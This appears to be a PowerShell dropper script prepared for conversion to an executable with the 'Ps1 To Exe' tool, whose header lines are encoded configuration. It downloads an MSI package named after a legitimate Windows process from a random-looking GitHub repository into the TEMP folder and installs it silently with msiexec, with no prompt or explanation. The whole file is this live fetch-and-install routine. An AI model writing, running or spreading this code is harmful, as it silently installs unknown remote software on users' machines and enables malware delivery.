##[Ps1 To Exe]
##
##Kd3HDZOFADWE8uO1
##Nc3NCtDXTlaDjofG5iZk2WrgRnouefm/vKWs0I6sw8fjoSTQUbMXRlo5nyrzZA==
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTiW5
##OsHQCZGeTiiZ4dI=
##OcrLFtDXTiW5
##LM/BD5WYTiiZ49I=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+VslQ=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlaDjofG5iZk2WrgRnouefm/vKWs0I6sw8fjoSTQUaonB1Fvk0k=
##Kc/BRM3KXxU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
$msiUrl = "https://github.com/AngryBirds23/Q.8jKpSsGh.YYwXm/raw/refs/heads/main/AggregatorHost.msi"
$tempMsi = "$env:TEMP\AggregatorHost.msi"

# Download the MSI
Invoke-WebRequest -Uri $msiUrl -OutFile $tempMsi -UseBasicParsing

# Install the MSI silently
Start-Process "msiexec.exe" -ArgumentList "/i `"$tempMsi`" /quiet" -Wait